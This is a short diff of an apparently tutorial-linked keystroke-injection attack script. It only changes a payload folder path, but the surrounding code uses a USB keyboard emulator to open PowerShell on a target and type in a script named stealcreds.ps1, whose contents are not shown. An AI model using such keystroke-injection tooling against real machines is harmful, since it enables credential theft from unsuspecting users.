@@ -34,12 +34,12 @@ lang="us" # MAKE THE KEYBOARD LANGUAGE MATCH THE TARGET
 function onKeyboardUp()
 {
 	# execute DuckyScript responsible for bringing up PowerShell
-	cat $wdir/payloads/hakin9/startps.duck | duckhid
+	cat $wdir/payloads/hakin9_tutorial/startps.duck | duckhid
 	
 	# print out the PowerShell script as raw ASCII
 	# Important: The script has to end with an empty line, to force pressing
 	# RETURN after the last line
-	cat $wdir/payloads/hakin9/stealcreds.ps1 | outhid
+	cat $wdir/payloads/hakin9_tutorial/stealcreds.ps1 | outhid
 }
 
 
